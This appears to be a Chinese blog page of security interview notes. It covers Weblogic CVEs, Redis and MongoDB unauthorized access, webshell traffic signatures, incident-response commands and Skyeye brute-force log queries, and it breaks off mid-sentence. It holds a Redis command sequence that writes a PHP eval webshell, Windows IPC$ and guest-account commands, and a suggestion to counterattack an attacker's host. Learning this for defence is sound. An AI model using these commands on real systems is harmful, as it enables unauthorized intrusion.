WLS核心组件反序列化漏洞 CVE-2018-2893Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）Weblogic 反序列化漏洞 CVE-2017-3506Weblogic 反序列化漏洞 CVE-2017-3248Weblogic SSRF漏洞 CVE-2014-4210<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、常见未授权漏洞"><a href="#二、常见未授权漏洞" class="headerlink" title="二、常见未授权漏洞"></a>二、常见未授权漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180206524.png" alt="image-20230731180206524"></p><p><strong>redis</strong>   ：  端口开放到公网，默认可能没有配置用户名，利用未授权访问进去写shell，或者通过ssh的公钥进行反弹</p><h3 id="二、redis"><a href="#二、redis" class="headerlink" title="二、redis"></a>二、redis</h3><h3 id="简述一下Redis-未授权访问漏洞。"><a href="#简述一下Redis-未授权访问漏洞。" class="headerlink" title="简述一下Redis 未授权访问漏洞。"></a><strong>简述一下Redis 未授权访问漏洞。</strong></h3><p><strong>Redis 默认情况下，会绑定在 0.0.0.0:6379</strong>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将  <strong>Redis 服务暴露到公网上</strong>，如果在没有设置<strong>密码认证</strong>（<strong>一般为空</strong>），会导致<strong>任意用户</strong>在<strong>可以访问目标服务器的情况下</strong><strong><strong>未授权访问</strong></strong> Redis 以及<strong>读取  Redis 的数据</strong>。攻击者在未授权访问 Redis 的情况下，可以<strong>利用 Redis 自身的提供</strong>的 <strong>config 命令</strong>像目标主机写  WebShell、写 SSH 公钥、创建计划任务<strong>反弹 Shell</strong> 等。其思路都是一样的，就是先将 Redis 的<strong>本地数据库存放目录设置为 web 目录、</strong>~/.ssh 目录或 /var/spool/cron 目录等，然后将  dbfilename（<strong>本地数据库文件名</strong>）设置为文件名你想要写入的文件名称，最后再执行 <strong>save</strong> 或 <strong>bgsave</strong>  保存，则我们就指定的目录里写入指定的文件了。</p><p>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网。 没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config set dir /var/www/html/ config set dbfilename shell.phpset xxx "&lt;?php eval($_POST[whoami]);?&gt;" save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Redis-未授权访问漏洞如何利用？"><a href="#Redis-未授权访问漏洞如何利用？" class="headerlink" title="Redis 未授权访问漏洞如何利用？"></a><strong>Redis 未授权访问漏洞如何利用？</strong></h3><blockquote><p>服务端的 Redis 连接存在未授权，在攻击机上能用 redis-cli 直接登陆连接，并未登陆验证。 开了服务端存在 Web 服务器，并且知道 Web 目录的路径（如利用 phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限。</p></blockquote><h3 id="未授权的条件，修复方式"><a href="#未授权的条件，修复方式" class="headerlink" title="未授权的条件，修复方式"></a><strong>未授权的条件，修复方式</strong></h3><p>Redis 未授权访问是指某些 Redis 实例的访问控制没有得到正确配置，导致攻击者可以通过不需要认证的方式直接连接该实例并进行操作。这可能会导致敏感数据泄露、系统被攻击等安全问题。</p><p>修复 Redis 未授权访问的方式包括以下几个步骤：</p><ol><li>确认是否存在未授权访问：通过检查日志和网络流量等信息，确认是否存在未授权访问的情况。</li><li>修改 Redis 配置文件：在 redis.config 配置文件中，找到 bind 参数并将其设置为 Redis 监听的 IP 地址。此外，还需要设置 requirepass 参数，并设置一个强密码来保护 Redis 数据库。</li><li>重新启动 Redis 服务：在修改完 Redis 配置文件后，需要重新启动 Redis 服务，以便使新的配置生效。</li><li>禁用 Redis 远程访问：如果您的 Redis 服务只在本地使用，则应禁用 Redis 的远程访问，以降低攻击面和提高安全性。</li><li>定期更新 Redis 和操作系统补丁：及时更新 Redis 和操作系统的安全补丁，以修复已知漏洞和提高系统安全性。</li></ol><p>总之，在修复 Redis 未授权访问时，我们需要先确认是否存在未授权访问的情况，然后按照上述步骤进行修复。为了保证系统安全，我们还需要经常检查 Redis 配置文件和操作系统状态，及时更新补丁，并定期进行安全审计和漏洞扫描等操作。</p><h3 id="二、MongoDB-未授权访问漏洞"><a href="#二、MongoDB-未授权访问漏洞" class="headerlink" title="二、MongoDB 未授权访问漏洞"></a>二、MongoDB 未授权访问漏洞</h3><p> <a href="https://cloud.tencent.com/product/mongodb?from=10680">MongoDB</a> 服务安装后，默认未开启权限验证。如果服务监听在 0.0.0.0，则可远程无需授权访问<a href="https://cloud.tencent.com/solution/database?from=10680">数据库</a>。</p><p>​    3.0 之前版本的 MongoDB, 默认监听在 0.0.0.0，3.0 及之后版本默认监听在 127.0.0.1。</p><p>​    3.0 之前版本，如未添加用户管理员账号及数据库账号，使用 –auth 参数启动时，在本地通过 127.0.0.1 仍可无需账号密码登陆访问数据库，远程访问则提示需认证；</p><p>​    3.0 及之后版本，使用 –auth 参数启动后，无账号则本地和远程均无任何数据库访问权限。</p><h2 id="三、常见中间件漏洞"><a href="#三、常见中间件漏洞" class="headerlink" title="三、常见中间件漏洞"></a>三、常见中间件漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175913646.png" alt="image-20230731175913646"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180017470.png" alt="image-20230731180017470"></p><h3 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a><strong>中间件基线规范（APACHE）</strong></h3><p>Apache 是一款常用的 Web 服务器软件，为了保障其安全可靠地运行，可以制定中间件基线规范。以下是 Apache 中间件基线规范的一些重要措施：</p><ol><li>版本号管理：定期检查并更新 Apache 版本，及时安装最新版本的补丁与安全更新。</li><li>配置文件规范：对 Apache 的配置文件进行规范化和审计，限制网站访问权限、禁止目录浏览等。</li><li>日志管理：启用 Apache 访问日志和错误日志，定期清理日志文件并做好备份、归档等工作。</li><li>安全加固：如禁用不必要的模块、关闭 TRACE 请求响应、限制 HTTP 方法等。</li><li>SSL/TLS 加强：设置 TLS 选项、开启 HSTS、使用证书身份验证等。</li><li>防火墙和反向代理策略：通过防火墙等技术来过滤恶意流量，使用反向代理策略限制直接连接到 Web 服务器的 IP 地址。</li><li>应用安全：对 Web 应用程序进行安全审计，确保程序的漏洞被修复、未受到攻击等。</li></ol><p>需要注意的是，以上这些措施只是 Apache 中间件基线规范的一部分，实际操作中还需要根据具体情况进行评估和调整。同时，要保障 Apache 服务器的安全性和可靠性，还需要定期备份数据、优化性能等工作。</p><hr><h3 id="中间件常见漏洞"><a href="#中间件常见漏洞" class="headerlink" title="中间件常见漏洞"></a><strong>中间件常见漏洞</strong></h3><p>中间件是指应用程序和操作系统之间的软件组件，常见的中间件漏洞有以下几种：</p><ol><li>Web服务器漏洞：针对Web服务器（如Apache、Nginx）的攻击通常包括利用目录遍历、文件包含、SQL注入等技术。</li><li>数据库漏洞：数据库（如MySQL、Oracle、SQL Server）的漏洞通常涉及未授权的访问、SQL注入等方面。</li><li>应用服务器漏洞：应用服务器（如Tomcat、JBoss、WebLogic）的漏洞通常会导致远程执行代码、拒绝服务等问题。</li><li>消息队列漏洞：消息队列（如RabbitMQ、Kafka）的漏洞通常涉及未授权访问、拒绝服务等问题。</li><li>缓存服务器漏洞：缓存服务器（如Redis、Memcached）的漏洞通常包括未授权访问、命令注入等问题。</li><li>中间件配置问题：中间件的错误配置也可能导致安全问题，比如弱密码、不安全的协议配置等。</li></ol><p>需要注意的是，中间件漏洞是日益增多的，因此建议及时更新和修补中间件的安全漏洞。</p><hr><h3 id="常见中间件的配置文件路径知道哪些？"><a href="#常见中间件的配置文件路径知道哪些？" class="headerlink" title="常见中间件的配置文件路径知道哪些？"></a><strong>常见中间件的配置文件路径知道哪些？</strong></h3><p>不同的中间件软件有不同的配置文件路径。以下是几种常见中间件软件的配置文件路径：</p><ol><li>Apache Web 服务器：httpd.conf 文件通常位于 /etc/httpd/ 或者 /usr/local/apache2/conf/ 目录下。</li><li>Nginx Web 服务器：nginx.conf 文件通常位于 /etc/nginx/ 或者 /usr/local/nginx/conf/ 目录下。</li><li>MySQL 数据库：my.cnf 文件通常位于 /etc/mysql/ 或者 /usr/local/mysql/etc/ 目录下。</li><li>PostgreSQL 数据库：postgresql.conf 和 pg_hba.conf 文件通常位于 /var/lib/pgsql/data/ 或者 /etc/postgresql/<version>/main/ 目录下。</version></li><li>Oracle 数据库：initSID.ora 和 listener.ora 文件通常位于 $ORACLE_HOME/dbs/ 目录下。</li><li>Tomcat 应用服务器：server.xml、context.xml 和 web.xml 文件通常位于 /conf/ 目录下。</li><li>JBoss 应用服务器：standalone.xml 和 standalone-full.xml 文件通常位于 /standalone/configuration/ 目录下。</li></ol><p>需要注意的是，这些路径可能会根据不同的操作系统而有所不同，并且也会随着中间件版本的更新而变化。因此，在进行中间件配置时，建议查询官方文档或参考相关文献以获取最新的配置文件路径信息。</p><h2 id="二、Struts2-漏洞"><a href="#二、Struts2-漏洞" class="headerlink" title="二、Struts2 漏洞"></a>二、Struts2 漏洞</h2><p>Struts2 是 apache 项目下的一个 web 框架，使用 OGNL 作为默认的表达式语言，由于 OGNL  能够创建或更改可执行代码，因此能够为使用它的任何框架引入严重的安全漏洞，多个 Apache Struts 2 版本容易受到 OGNL  安全漏洞的攻击。</p><h2 id="三、thinkphp漏洞原理："><a href="#三、thinkphp漏洞原理：" class="headerlink" title="三、thinkphp漏洞原理："></a>三、thinkphp漏洞原理：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731174450857.png" alt="image-20230731174450857"></p><h2 id="二、常问的端口信息："><a href="#二、常问的端口信息：" class="headerlink" title="二、常问的端口信息："></a>二、常问的端口信息：</h2><p>21：（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。<br>22：（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。</p><p>23：（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。<br>25：（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。</p><p>53：（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。<br>80/443 ：（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。<br>443：HTTPS安全超文本传输协议</p><p>135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。</p><p>139/445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。</p><p>3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。</p><p>1433：MSSQL<br>3306：MYSQL<br>3389：windows远程桌面服务端口<br>7701：weblogic<br>8080：TCP,HTTP协议代理服务器：Apache-tomcat默认端口号</p><p>以上仅是一些常见的端口及其漏洞，实际上还有很多其他的端口和漏洞。为了减少被攻击的风险，建议定期进行安全扫描，及时修复已知漏洞，并加强网络安全防护。</p><p>拿到webshell不出网情况下怎么办:<br>reg上传去正向连接。探测出网协议，如dns，icmp。</p><h2 id="二、冰蝎3-0流量特征："><a href="#二、冰蝎3-0流量特征：" class="headerlink" title="二、冰蝎3.0流量特征："></a>二、冰蝎3.0流量特征：</h2><ol><li><h3 id="content-type"><a href="#content-type" class="headerlink" title="content-type"></a>content-type</h3></li><li><h3 id="Accept-amp-Cache-Control"><a href="#Accept-amp-Cache-Control" class="headerlink" title="Accept&amp;Cache-Control"></a>Accept&amp;Cache-Control</h3></li><li><h3 id="user-Agent"><a href="#user-Agent" class="headerlink" title="user-Agent"></a>user-Agent</h3></li><li><h3 id="请求中content-length"><a href="#请求中content-length" class="headerlink" title="请求中content-length"></a>请求中content-length</h3></li></ol><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170930747.png" alt="image-20230731170930747"></p><h2 id="二、cs的流量特征：50050端口，心跳包"><a href="#二、cs的流量特征：50050端口，心跳包" class="headerlink" title="二、cs的流量特征：50050端口，心跳包"></a>二、cs的流量特征：50050端口，心跳包</h2><h2 id="二、冰蝎4-0的流量特征（和3-0对比观看）："><a href="#二、冰蝎4-0的流量特征（和3-0对比观看）：" class="headerlink" title="二、冰蝎4.0的流量特征（和3.0对比观看）："></a>二、冰蝎4.0的流量特征（和3.0对比观看）：</h2><p>v3.0 和 v4.0 的区别很明显在于这里 <code>$_SESSION['k']=$key</code>，v3.0 版本当中会把 key 作为 session 传入；接着判断 <code>extension_loaded</code>，也就是判断服务端是否存在 <code>openssl</code>拓展，如果不存在就用 base64 解码，然后使用 key 进行异或加密，这也是冰蝎 v4.0 版本当中的 <code>xor_base64</code>加密方式；如果服务端能够加载 openssl 拓展，就使用 AES128 解密，这里对应冰蝎 v4.0 版本当中的 <code>aes</code>加密方式。</p><h3 id="第一阶段-密钥协商"><a href="#第一阶段-密钥协商" class="headerlink" title="第一阶段-密钥协商"></a><strong>第一阶段-密钥协商</strong></h3><p>1.攻击者通过 GET 或者 POST 方法，形如 <a href="http://127.0.0.1/shell.php?pass=645%E7%9A%84%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%86%E9%92%A5%EF%BC%9B">http://127.0.0.1/shell.php?pass=645的请求服务器密钥；</a></p><p>2.服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 <code>$_SESSION</code>变量中，并返回密钥给攻击者。</p><h3 id="第二阶段-加密传输"><a href="#第二阶段-加密传输" class="headerlink" title="第二阶段-加密传输"></a><strong>第二阶段-加密传输</strong></h3><p>1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；</p><p>2）服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令；</p><p>3）执行结果通过 AES 加密后返回给攻击者。</p><ul><li>但是我自己在分析的过程中并没有看到这个密钥协商的过程，同时也没有看到 <code>$_SESSION</code>变量当中存储了 md5 的高 16 位，反而 <code>$_SESSION</code>变量存储的是一个 26 位的字符。不知道这里是我的问题还是冰蝎 4.0 版本就是如此。</li></ul><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731172240969.png" alt="image-20230731172240969"></p><h2 id="二、菜刀流量特征："><a href="#二、菜刀流量特征：" class="headerlink" title="二、菜刀流量特征："></a>二、菜刀流量特征：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731172616407.png" alt="image-20230731172616407"></p><h2 id="二、蚁剑流量特征"><a href="#二、蚁剑流量特征" class="headerlink" title="二、蚁剑流量特征:"></a>二、蚁剑流量特征:</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173230742.png" alt="image-20230731173230742"></p><h2 id="二、哥斯拉流量特征："><a href="#二、哥斯拉流量特征：" class="headerlink" title="二、哥斯拉流量特征："></a>二、哥斯拉流量特征：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173320610.png" alt="image-20230731173320610"></p><h2 id="三、fastjson不出网利用："><a href="#三、fastjson不出网利用：" class="headerlink" title="三、fastjson不出网利用："></a>三、fastjson不出网利用：</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175610705.png" alt="image-20230731175610705"></h2><h2 id="三、存在-反序列化-中间件"><a href="#三、存在-反序列化-中间件" class="headerlink" title="三、存在 反序列化 中间件"></a>三、存在 反序列化 中间件</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175803413.png" alt="image-20230731175803413"></p><h2 id="三、nmap常用参数："><a href="#三、nmap常用参数：" class="headerlink" title="三、nmap常用参数："></a>三、nmap常用参数：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180541206.png" alt="image-20230731180541206"></p><h2 id="四、怎么绕过-cdn，寻找真实-ip："><a href="#四、怎么绕过-cdn，寻找真实-ip：" class="headerlink" title="四、怎么绕过 cdn，寻找真实 ip："></a>四、怎么绕过 cdn，寻找真实 ip：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180616607.png" alt="image-20230731180616607"></p><h2 id="四、linux应急响应常用命令（T1）："><a href="#四、linux应急响应常用命令（T1）：" class="headerlink" title="四、linux应急响应常用命令（T1）："></a>四、linux应急响应常用命令（T1）：</h2><h3 id="1-系统排查"><a href="#1-系统排查" class="headerlink" title="1.系统排查"></a>1.系统排查</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180655883.png" alt="image-20230731180655883"></p><h3 id="2-进程排查"><a href="#2-进程排查" class="headerlink" title="2.进程排查"></a>2.进程排查</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181123128.png" alt="image-20230731181123128"></p><h3 id="3-服务排查"><a href="#3-服务排查" class="headerlink" title="3.服务排查"></a>3.服务排查</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181528422.png" alt="image-20230731181528422"></p><h3 id="4-日志分析"><a href="#4-日志分析" class="headerlink" title="4.日志分析"></a>4.日志分析</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181640388.png" alt="image-20230731181640388"></p><h3 id="5-查看登陆成功日期、用户名、IP地址的命令"><a href="#5-查看登陆成功日期、用户名、IP地址的命令" class="headerlink" title="5.查看登陆成功日期、用户名、IP地址的命令"></a>5.查看登陆成功日期、用户名、IP地址的命令</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181844954.png" alt="image-20230731181844954"></p><h2 id="四、windows应急响应常用命令（T1）："><a href="#四、windows应急响应常用命令（T1）：" class="headerlink" title="四、windows应急响应常用命令（T1）："></a>四、windows应急响应常用命令（T1）：</h2><h3 id="1-系统账户相关"><a href="#1-系统账户相关" class="headerlink" title="1.系统账户相关"></a>1.系统账户相关</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182023367.png" alt="image-20230731182023367"></p><h3 id="2-进程端口相关"><a href="#2-进程端口相关" class="headerlink" title="2.进程端口相关"></a>2.进程端口相关</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182243135.png" alt="image-20230731182243135"></p><h3 id="3-启动项，计划任务，服务"><a href="#3-启动项，计划任务，服务" class="headerlink" title="3.启动项，计划任务，服务"></a>3.启动项，计划任务，服务</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182316866.png" alt="image-20230731182316866"></p><h3 id="4-日志目录"><a href="#4-日志目录" class="headerlink" title="4.日志目录"></a>4.日志目录</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182405270.png" alt="image-20230731182405270"></p><h2 id="三、Winodws-命令执行漏洞"><a href="#三、Winodws-命令执行漏洞" class="headerlink" title="三、Winodws 命令执行漏洞"></a>三、Winodws 命令执行漏洞</h2><p>Windows 命令执行漏洞，就是在 Winodws 环境下存在的命令执行漏洞，通过相关的漏洞验证方法确认了存在命令执行漏洞后，我们可以使用 Windows 环境下的一些命令去对漏洞进行利用。</p><ul><li>通过涉及到主机探测、扫描、路由、协议、远程、进程、端口、服务等常见的 Windows 的命令</li><li>如果我们的服务器是一台 Windows 操作系统，存在着命令执行漏洞</li><li>我们就可以通过上面的这些漏洞进行命令执行的操作 </li><li>对 Windows 服务器系统进行扫描探测、进行进程和服务管理、进行内网渗透、服务器提限等</li></ul><h3 id="Windows-命令执行漏洞利用"><a href="#Windows-命令执行漏洞利用" class="headerlink" title="Windows 命令执行漏洞利用**"></a>Windows 命令执行漏洞利用**</h3><p>通过以上的学习我们知道了 Windows 下的命令执行漏洞的原理以及一些利用方法，下面将列出常用到的 Windows 命令，可以利用到 Windows 命令执行的漏洞当中去。</p><ul><li>ipconfig /all 查看网络连接</li><li>net use \ip\ipc$ “” /user:” “    建立 IPC 空链接</li><li>net use \ip\ipc$ “密码” /user:”用户名” 建立 IPC 非空链接</li><li>net use h: \ip\c$ “密码” /user:”用户名” 直接登陆后映射对方 C：到本地为 H:</li><li>net use h: \ip\c$ 登陆后映射对方 C：到本地为 H:</li><li>net use \ip\ipc$ /del 删除 IPC 链接</li><li>net use h: /del 删除映射对方到本地的为 H: 的映射</li><li>net user guest /active:yes 激活 guest 用户</li><li>net user guest 12345 用 guest 用户登陆后用将密码改为 12345</li><li>echo 信息 &gt;&gt; pass.txt 将 “信息” 保存到 pass.txt 文件中</li></ul><h2 id="三、Linux-命令执行漏洞"><a href="#三、Linux-命令执行漏洞" class="headerlink" title="三、Linux 命令执行漏洞"></a>三、Linux 命令执行漏洞</h2><ul><li>Linux 命令执行漏洞，就是在 Linux 服务器上存在的命令执行下漏洞</li><li>Linux 命令执行漏洞相对于 Windows 命令执行漏洞来说，利用起来更加的容易</li><li>因为 Linux 的一些操作本省就是需要通过一些命令去进行管理和执行</li></ul><p>命令在 Linux 中的执行分为 4 步：判断路径、检查别名、判断内外部、路径查找文件</p><h3 id="Linux-命令执行漏洞Linux-命令执行漏洞利用"><a href="#Linux-命令执行漏洞Linux-命令执行漏洞利用" class="headerlink" title="Linux 命令执行漏洞Linux 命令执行漏洞利用"></a>Linux 命令执行漏洞Linux 命令执行漏洞利用</h3><ul><li>Linux 系统下基本命令，我们注意这些命令要区分大小写</li><li>通过这些命令我们可以对 Linux 下的命令执行漏洞进行利用</li><li>包括系统、资源、进程、网络、用户、服务等常见的 Linux 系统命令</li></ul><h2 id="三、说一下你的漏洞挖掘经历："><a href="#三、说一下你的漏洞挖掘经历：" class="headerlink" title="三、说一下你的漏洞挖掘经历："></a>三、说一下你的漏洞挖掘经历：</h2><p>挖的edu，找到个水平越权，直接改id=什么就好</p><h2 id="四、ip溯源办法："><a href="#四、ip溯源办法：" class="headerlink" title="四、ip溯源办法："></a>四、ip溯源办法：</h2><p>如果是代理就没意义，如果不是代理反查域名绑定，拿信息，丢裤子里，如果是个<br>web，就打回去拿信息</p><h2 id="四、有没有用过设备："><a href="#四、有没有用过设备：" class="headerlink" title="四、有没有用过设备："></a>四、有没有用过设备：</h2><p>奇安信的天眼、WAF 、蜜罐、绿盟态势感知、防火墙、IDS（入侵检测系统）、IPS（入侵防御系统），中睿的睿眼，他会自动匹配可能是攻击的数据包，然后通过数据包判断是否是攻击。</p><p>天眼的全称是奇安信新一代安全感知系统，它以攻防渗透和数据分析为核心竞争力，聚焦威胁检测和响应，为安全服务和分析人员提供一套在监测预警、威胁检测、溯源分析和响应处置上得心应手的威胁检测平台。</p><ul><li><p>天眼三大功能：</p><p>传感器（对流量解析还原，发现网络攻击和 web 攻击能力） </p><p>沙箱（发现恶意样本投递能力）</p><p>分析平台（存储历史流量，分析威胁和溯源能力）  </p></li><li><p>天眼使用：</p><p>天眼威胁感知： 警告类型：APT 攻击   威胁级别：高危   攻击结果：失陷    攻击次数：3 </p><p>天眼搜索：源 IP sip   目的 IP dip  地理信息：境内还是境外   </p><p>搜索示例:（sip:”192.168.1.1”）OR（dip:”192.168.1.1”）  </p><p>天眼类别：威胁感知调查分析 场景化分析</p><p>日志检索：例子：search sip:”10.1.1.1/8” |tcp 100 dip 资产 报表 安全服务  系统管理</p></li><li><p>天眼分析：</p><p>爆破和踩点行为分析：</p><p>登录爆破类：单个IP，使用多个用户名和密码组合进行登录尝试，导致短时间内大量登录失败<br>目录和资源爆破：短时间内访问大量url，触发大量404<br>手段：</p><p>1.找到爆破行为IP，阻断爆破行为    </p><p>2.找到攻击成功的IP   </p><p>3.分析攻击IP的操作，编写事件报告</p><p>ftp 爆破：</p><pre class="line-numbers language-none"><code class="language-none">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ftp判断爆破成功行为：normal_ret:success  AND proto:ftp AND sip:(攻击ip1 OR 攻击ip2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ssh 爆破：</p><pre class="line-numbers language-none"><code class="language-none">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ssh判断爆破成功行为：normal_ret:success AND proto:ssh AND sip(攻击ip1 OR 攻击ip2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>数据库爆破：</p><pre class="line-numbers language-none"><code class="language-none">normal_ret:failed AND proto:(oracle OR mysql OR mssql OR postgresql)normal_ret:success AND proto:(oracle OR mysql OR mssql OR postgresql) AND sip:(攻击IP1 OR 攻击IP2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>远程桌面爆破：</p><pre class="line-numbers language-none"><code class="language-none">normal_ret:failed AND proto:rdpnormal_ret:success AND proto:rdp AND sip:(攻击IP1 OR 攻击IP2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>web 登录入口爆破：</p><pre class="line-numbers language-none"><code class="language-none">对弱口令就行分析：uri:爆破路径 AND sip:攻击ip，查找爆破的流量日志<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目录和资源猜解：</p><pre class="line-numbers language-none"><code class="language-none">根据域名和攻击ip进行分析：host:域名 AND sip:攻击IP，查询攻击IP的访问记录是否触发大量404响应<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>天眼失陷事件处理：</p><p>1、web攻击分析思路：<br>web攻击：查看请求包 与 响应包（有没有报红，有没有攻击成功）<br>查看告警详情（查看请求头、请求体内容，定位到告警攻击动作的payload）<br>分析攻击动作是什么（读取文件、打印输出内容、写入文件和尝试下载文件，执行函数或命令 XSS  XXE webshell等）<br>分析响应（分析告警响应头，响应体，网络行为是否有动作预期的结果）  </p><p> 发现 webshell 和主机木马： 确认创建时间、功能分析等，查看访问日志，攻击行为记录等，通知主机所属人 对发现的 webshell 文件或木马进行排查处置</p></li></ul><h2 id="四、一个登录框可以怎么测试："><a href="#四、一个登录框可以怎么测试：" class="headerlink" title="四、一个登录框可以怎么测试："></a>四、一个登录框可以怎么测试：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182915977.png" alt="image-20230731182915977"></p><h2 id="四、数据库提权思路："><a href="#四、数据库提权思路：" class="headerlink" title="四、数据库提权思路："></a>四、数据库提权思路：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731183520438.png" alt="image-20230731183520438"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731183550241.png" alt="image-20230731183550241"></p><h2 id="四、如果有1w条告警怎么办："><a href="#四、如果有1w条告警怎么办：" class="headerlink" title="四、如果有1w条告警怎么办："></a>四、如果有1w条告警怎么办：</h2><p>样本降噪，看200，找有没有外联的东西，打进来肯定是要干点什么的，看命令执行，看ip。</p><h2 id="四、普通的加固手段"><a href="#四、普通的加固手段" class="headerlink" title="四、普通的加固手段"></a>四、普通的加固手段</h2><p>普通的加固手段包括以下几种：</p><ol><li>更新补丁：定期更新操作系统、应用程序的补丁，修复已知的漏洞和安全问题。</li><li>强化口令策略：采用复杂、难以猜测的密码，并进行定期更换。同时可以启用账户锁定、多次失败尝试限制等功能，提高口令安全性。</li><li>加强身份验证：采用多因素身份验证技术，例如使用硬件令牌、生物特征等方式，确保只有授权用户才能访问系统。</li><li>安装防病毒软件：安装并及时更新防病毒软件，定期进行全盘扫描和实时监控，以便及时发现和处置潜在的恶意软件。</li><li>关闭不必要服务：关闭系统中不必要的服务和端口，降低攻击面，避免被利用。</li><li>限制访问权限：根据业务需要，设置合理的访问权限，对于未授权的用户或者设备进行限制，提高系统的安全性。</li><li>数据备份与恢复：定期备份重要数据，并将其存储在安全可靠的位置。在出现故障或事件时，能够快速恢复数据，避免数据丢失和系统停机。</li></ol><p>总之，以上这些普通的加固手段可以帮助提高系统的安全性和稳定性，并且也是网络安全基础建设的关键步骤。在实际操作中，需要根据具体情况和需求，结合其他安全措施来进行综合加固。同时需要注意及时更新和检查，以确保系统始终处于安全状态。</p><h2 id="四、WebShell-的利用"><a href="#四、WebShell-的利用" class="headerlink" title="四、WebShell 的利用"></a>四、WebShell 的利用</h2><p>Webshell 是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除 web  页面、修改主页等。黑客通常利用常见的漏洞，如 SQL 注入、远程文件包含 (RFI)、FTP，甚至使用跨站点脚本攻击 (XSS)  等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p><p>黑客可以用 web 的方式，通过 asp 或 php 木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。</p><p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p><ul><li><p>WebShell 的分类 ①根据文件大小分类：大马和小马 (通常指的是一句话木马，能够使用菜刀这类工具去直接连接它) ②根据脚本名称分类：jsp、asp、aspx、php</p></li><li><p>WebShell 的利用</p><p>寻找页面上传点</p><p>写好一句话木马（上传木马），比如如下的 PHP 